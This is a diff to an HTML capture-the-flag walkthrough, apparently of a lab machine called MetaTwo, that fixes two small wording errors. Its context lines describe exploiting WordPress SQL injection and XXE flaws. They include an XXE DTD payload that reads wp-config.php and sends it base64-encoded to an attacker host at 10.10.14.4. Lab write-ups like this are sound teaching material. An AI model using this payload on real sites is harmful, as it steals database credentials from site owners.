@@ -193,7 +193,7 @@
         <img src="../images/metatwo14.png">
 
         <h2>Exploit - SQL Injection</h2>
-        <p>The article also includes steps on how to exploit this. How nice of them :).</p>
+        <p>The article also includes steps on how to exploit this. How nice of them :)</p>
         <img src="../images/metatwo15.png">
         <p>The first two points can be skipped since they're meant for someone trying to replicate the environment. For the 3rd point, we can find the nonce here:</p>
         <img src="../images/metatwo16.png">
@@ -246,7 +246,7 @@
         <p>This confirms that we are able to read files within the target machine by using this exploit.</p>
         <p>The next file we want to read is wp-config.php. This file contains configurations which may include credentials. Usually, MySQL credentials are contained in this file and is located in the root WordPress directory.</p>
         <p>We can safely assume that the target machine is reading uploaded files from a path that's already in the WordPress directory, such as /wordpress/uploads. We can modify our evil.dtd file to go up one directory and grab wp-config.php (../wp-config.php),
-            assuming it's there. If it's not there, we can try to go up one more time. If we feel like we've went up too many times, then the wp-config.php is in another directory.</p>
+            assuming it's there. If it's not there, we can try to go up one more time. If we feel like we've gone up too many times, then the wp-config.php is in another directory.</p>
         <pre><code>&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php"></br>&lt;!ENTITY % init "&lt;!ENTITY &#x25; trick SYSTEM 'http://10.10.14.4:8000/?p=%file;'>" ></code></pre>
         <img src="../images/metatwo31.png">
         <p>Luckily, after uploading payload.wav again, we get a hit. The file wp-config.php was only one directory above.</p>
